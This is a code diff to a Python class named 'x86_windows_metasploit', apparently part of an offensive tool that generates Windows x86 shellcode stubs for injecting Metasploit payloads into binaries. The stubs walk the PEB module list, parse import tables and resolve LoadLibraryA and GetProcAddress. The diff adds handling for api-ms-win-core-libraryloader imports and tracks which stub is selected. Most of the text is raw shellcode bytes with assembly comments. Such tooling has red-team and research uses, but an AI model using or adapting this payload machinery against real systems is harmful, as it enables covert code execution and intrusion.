@@ -179,6 +179,8 @@ class x86_windows_metasploit:
               ]    
 
     def lla_gpa_parser_stub(self):
+        self.parser_stub = 'LLAGPA'
+                
         shellcode =  bytes( 
                "\xfc"
                "\x60"                               # pushad
@@ -258,6 +260,8 @@ class x86_windows_metasploit:
         return shellcode 
      
     def gpa_parser_stub(self): 
+        self.parser_stub = 'GPA'
+                
         shellcode = bytes( "\xfc"
                "\x60"                               # pushad
                "\x31\xd2"                           # xor edx, edx                          ;prep edx for use
@@ -369,7 +373,9 @@ class x86_windows_metasploit:
         # LOADLIBA in EBX
         # GETPROCADDR in EBP
         
-    def loaded_lla_gpa_parser_stub(self):            
+    def loaded_lla_gpa_parser_stub(self):
+        self.parser_stub = 'ExternLLAGPA'
+                         
         shellcode1 = bytes(  # Locate ADVAPI32 via PEB Ldr.InMemoryOrderModuleList ref:http://blog.harmonysecurity.com/2009_06_01_archive.html
               "\xfc"                                # cld
               "\x60"                                # pushad  
@@ -409,12 +415,30 @@ class x86_windows_metasploit:
              # findImport   
              "\x8b\x57\x0c"                         # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
              "\x03\xd3"                             # add edx, ebx                          ;Offset in memory
-             "\x81\x3a\x4b\x45\x52\x4e"             # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
-             "\x75\x09"                             # JE short 
-             "\x81\x7A\x04\x45\x4C\x33\x32"         # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
-             "\x74\x05"                             # je 0x102f                             ;jmp saveBase
-             "\x83\xc7\x14"                         # add edi, 0x14                         ;inc to next import
-             "\xeb\xe5"                             # jmp 0x101d                            ;Jmp findImport
+             , 'iso-8859-1')
+        if self.DLL_HASH['importname'] == 'kernel32.dll':
+            shellcode3 += (
+           b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+           b"\x75\x09"                               # JE short
+           b"\x81\x7A\x04\x45\x4C\x33\x32"           # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
+           b"\x74\x05"                               # je 0x102f                             ; jmp saveBase
+           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
+           b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
+           )
+        elif 'api-ms-win-core-libraryloader' in self.DLL_HASH['importname'].lower():
+            shellcode3 += (
+           b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
+           b"\x75\x09"
+           b"\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+           b"\x74\x05"
+           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
+           b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
+          )
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.exit(-1)
+        
+        shellcode3 += bytes(
              # saveBase 
              "\x57"                                 # push edi
              "\xeb\x39"                             # jmp short 0x9f
@@ -443,8 +467,17 @@ class x86_windows_metasploit:
              "\x83\xc5\x04"                         # add ebp,byte +0x4
              "\x83\xc6\x04"                         # add esi,byte +0x4
              "\xeb\xda"                             # jmp short 0x77
+             , 'iso-8859-1')
              # loadApis     
-             "\x68\x61\x72\x79\x41"                 # push dword 0x41797261
+        if self.DLL_HASH['importname'].lower() == 'kernel32.dll':
+            shellcode3 += b"\x68\x61\x72\x79\x41"                 # push dword 0x41797261 ; raryA
+        elif 'api-ms-win-core-libraryloader' in self.DLL_HASH['importname'].lower():
+            shellcode3 += b"\x68\x61\x72\x79\x45"
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.exit(-1)
+ 
+        shellcode3 += bytes(
              "\x68\x4c\x6f\x61\x64"                 # push dword 0x64616f4c
              "\xe8\xb8\xff\xff\xff"                 # call dword 0x62
              "\x01\xea"                             # add edx,ebp
@@ -460,12 +493,14 @@ class x86_windows_metasploit:
              "\x5b"                                 # pop ebx
              "\x8b\xea"                             # mov ebp,edx    
             , 'iso-8859-1')
-                   # LOADLIBA in EBX
-                   # GETPROCADDR in EBP
+            # LOADLIBA in EBX
+            # GETPROCADDR in EBP
     
         return shellcode1 + shellcode2 + shellcode3
         
     def loaded_gpa_iat_parser_stub(self):
+        self.parser_stub = 'ExternGPA'
+
         shellcode1 = bytes("\xfc"                   # cld
             "\x60"                                  # pushad
             "\x31\xd2"                              # xor edx,edx
@@ -507,24 +542,27 @@ class x86_windows_metasploit:
             , 'iso-8859-1')                            
         if self.DLL_HASH['importname'] == 'kernel32.dll':
             shellcode3 += (
-           b"\x81\x3a\x4b\x45\x52\x4e"              # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
-           b"\x75\x09"                              # JE short 
-           b"\x81\x7A\x04\x45\x4C\x33\x32"          # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
-           b"\x74\x05"                              # je 0x102f                             ; jmp saveBase
+           b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+           b"\x75\x09"                               # JE short 
+           b"\x81\x7A\x04\x45\x4C\x33\x32"           # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
+           b"\x74\x05"                               # je 0x102f                             ; jmp saveBase
+           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
+           b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
            )
         elif 'api-ms-win-core-libraryloader' in self.DLL_HASH['importname'].lower():
             shellcode3 += (
-          b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
-          b"\x75\x09"
-          b"\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
-          b"\x74\x05"
+           b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
+           b"\x75\x09"
+           b"\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+           b"\x74\x05"
+           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
+           b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
           )
         else:
             sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
             sys.exit(-1)
 
-        shellcode3 += bytes("\x83\xc7\x14"          # add edi, 0x14                         ;inc to next import
-            "\xeb\xe4"                              # jmp 0x101d                            ;Jmp findImport
+        shellcode3 += bytes(
             # saveBase
             "\x57"                                  # push edi
             "\xeb\x39"                              # jmp short 0x9f
@@ -846,7 +884,7 @@ class x86_windows_metasploit:
                     sys.stderr.write("\t-- This imported DLL will work for LLA/GPA: {0}\n".format(key))
                     self.hash(ntpath.basename(key.lower()))
                     self.lla_hash_dict[ntpath.basename(key.lower())] = {'hash' : self.DLL_HASH, 
-                                                                        'importname': 'kernel32.dll'
+                                                                        'importname': dll_location
                                                                         }
                     
             sys.stderr.write("\n\n[*] LLA/GPA binaries available, use with -p ExternLLAGPA -d dllname.dll -l import_name:\n")
@@ -932,7 +970,7 @@ class x86_windows_metasploit:
                 self.selected_payload = self.loaded_gpa_iat_parser_stub()
             elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                 self.hash(self.dll)
-                self.DLL_HASH = {'hash': self.DLL_HASH, 'importname': 'kernel32.dll'}
+                self.DLL_HASH = {'hash': self.DLL_HASH, 'importname': self.importname}
                 sys.stderr.write("[*] Using ExternLLAGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_HASH['hash']),
                     self.DLL_HASH['importname']))
                 self.selected_payload = self.loaded_lla_gpa_parser_stub()
@@ -949,9 +987,10 @@ class x86_windows_metasploit:
             if self.lla_gpa_found is True and self.parser_stub != 'GPA' and 'extern' not in self.parser_stub.lower():
                 sys.stderr.write("[*] Using LLAGPA stub\n")
                 self.selected_payload = self.lla_gpa_parser_stub()
-
+                self.DLL_HASH  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
             elif self.gpa_found is True and self.parser_stub != 'LLAGPA' and 'extern' not in self.parser_stub.lower():
                 sys.stderr.write("[*] Using GPA stub\n")
+                self.DLL_HASH  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
                 self.selected_payload = self.gpa_parser_stub()
 
             elif self.lla_hash_dict != {} and self.parser_stub != 'ExternGPA':
@@ -1252,11 +1291,31 @@ class x86_windows_metasploit:
         self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find DLL location
         self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
         self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
-        self.stub += b"\x51"                                # PUSH ECX                       ; push on stack for use
+        sys.stderr.write("Test: {0}".format(self.DLL_HASH['importname']))
+        if 'api-ms-win-core-libraryloader' in self.DLL_HASH['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
+            self.stub += b"\x33\xC0"                        # XOR EAX,EAX
+            self.stub += b"\x50"                            # PUSH EAX
+            self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+        
+        elif self.DLL_HASH['importname'].lower() == 'kernel32.dll' or self.DLL_HASH['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+            self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+        
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.exit(-1)
+ 
+        
         self.stub += b"\xFF\x13"                            # CALL DWORD PTR DS:[EBX]        ; Call KERNEL32.LoadLibraryA (DLL)
         # Get API and Call GPA
         self.stub += b"\x8B\xD0"                            # MOV EDX,EAX                    ; Save DLL Handle to EDX
-        self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; Prep EAX for use
+        if 'api-ms-win-core-libraryloader' in self.DLL_HASH['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
+            self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use
+            self.stub += b"\x50"                            # push EAX
+        elif self.DLL_HASH['importname'].lower() == 'kernel32.dll' or self.DLL_HASH['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+            self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.exit(-1)
         self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
         self.stub += struct.pack("<I", updated_offset + 4)  
         self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
